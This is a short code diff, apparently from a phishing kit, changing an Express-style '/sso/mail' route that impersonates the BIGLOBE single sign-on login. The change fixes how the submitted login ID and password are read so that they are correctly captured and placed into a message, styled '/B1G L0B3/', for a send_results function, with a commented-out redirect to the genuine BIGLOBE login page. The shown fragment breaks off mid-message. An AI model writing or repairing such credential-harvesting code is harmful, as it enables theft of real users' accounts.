@@ -23,8 +23,8 @@ function send_results(result_message){
 r.post('/sso/mail', (req, res) => {
     // const redirect_link = 'https://href.li?https://auth.sso.biglobe.ne.jp/mail/';
 
-    const { username } = req.body.loginid;
-    const { password } = req.body.biglobe_pw;
+    const username = req.body.loginid;
+    const password = req.body.biglobe_pw;
     // const password = req.body;
     const message = `/B1G L0B3/
 Us3rn4m3: ${username}
